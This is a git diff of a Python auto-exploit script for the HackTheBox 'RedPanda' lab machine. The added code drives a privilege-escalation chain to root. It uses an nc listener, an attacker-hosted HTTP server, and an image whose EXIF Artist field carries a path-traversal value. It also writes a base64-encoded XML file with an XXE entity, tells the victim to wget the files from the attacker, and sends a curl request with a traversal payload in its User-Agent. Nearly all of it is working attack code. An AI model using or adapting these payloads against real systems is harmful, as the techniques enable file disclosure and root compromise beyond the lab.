@@ -46,7 +46,7 @@ def banner():
        ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
            ░                                                             
     __________________________________________________________________________
-    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Pandora
+    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-RedPanda
     __________________________________________________________________________\n"""
     print(Fore.BLUE + f"{bnn}")
 
@@ -145,10 +145,15 @@ def conection_woodenk():
 
 
 def exploit_user_root():
-    print(tmsg,Fore.LIGHTBLUE_EX +f"[woodenk-user Command ()] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
-    commands_send("wget ehttp://10.10.11.170:8080/img/smiley.jpg")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
+    commands_send(f"wget http://{target_machine}:8080/img/smiley.jpg")
     commands_send("mv smiley.jpg pwned.jpg")
     commands_send("exiftool -Artist=../../../../../../tmp/pwn pwned.jpg")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Listen Http)] > " + Fore.LIGHTMAGENTA_EX + f"sudo python -m http.server 8080")
+    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [root-user] > " + Fore.WHITE + f"Press ENTER to continue...")
+    commands_send("echo 'cj53b29kZW5rPC9hdXRob3I+CiAgPGltYWdlPgogICAgPHVyaT4meHhlOzwvdXJpPgogICAgPHZpZXdzPjE8L3ZpZXdzPgogIDwvaW1hZ2U+CiAgPGltYWdlPgogICAgPHVyaT4vaW1nL2h1bmd5LmpwZzwvdXJpPgogICAgPHZpZXdzPjA8L3ZpZXdzPgogIDwvaW1hZ2U+CiAgPGltYWdlPgogICAgPHVyaT4vaW1nL3Ntb29jaC5qcGc8L3VyaT4KICAgIDx2aWV3cz4wPC92aWV3cz4KICA8L2ltYWdlPgogIDxpbWFnZT4KICAgIDx1cmk+L2ltZy9zbWlsZXkuanBnPC91cmk+CiAgICA8dmlld3M+MDwvdmlld3M+CiAgPC9pbWFnZT4KICA8dG90YWx2aWV3cz4xPC90b3RhbHZpZXdzPgo8L2NyZWRpdHM+Cgo=' | base64 -d > pwned_creds.xml")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. cd /tmp\n2. wget http://{machine_ip}:8080/pwned.jpg\n3. wget http://{machine_ip}:8080/pwned_creds.xml\n4. chmod 777 pwned_creds.xml\n5. watch -n 1 cat pwned_creds.xml")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user Command (Attack Machine)] > " + Fore.LIGHTMAGENTA_EX + f'curl -s -X get -A "prueba||/../../../../../../../../../tmp/pwned.jpg" {target_machine}:8080')
 
 
 #------------------------------------------------------------------------
@@ -166,10 +171,10 @@ def undected():
                 conection_woodenk()
                 print(tmsg,Fore.LIGHTBLUE_EX +f"[woodenk] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
             elif opcion[0] == opcion[1][1]:
-                print(tmsg,hmsg("user","Matt connection"))
-                print(tmsg,Fore.LIGHTBLUE_EX +f"[Matt] > " + Fore.YELLOW + f"MS16-098-Overflow (Exploit) http://{target_machine}");cm.sleep(0.2)
+                print(tmsg,hmsg("user","Root connection"))
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.YELLOW + f"(Exploit) http://{target_machine}");cm.sleep(0.2)
                 exploit_user_root()
-                print(tmsg,Fore.LIGHTBLUE_EX +f"[Matt] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
                 break
             else:
                 break
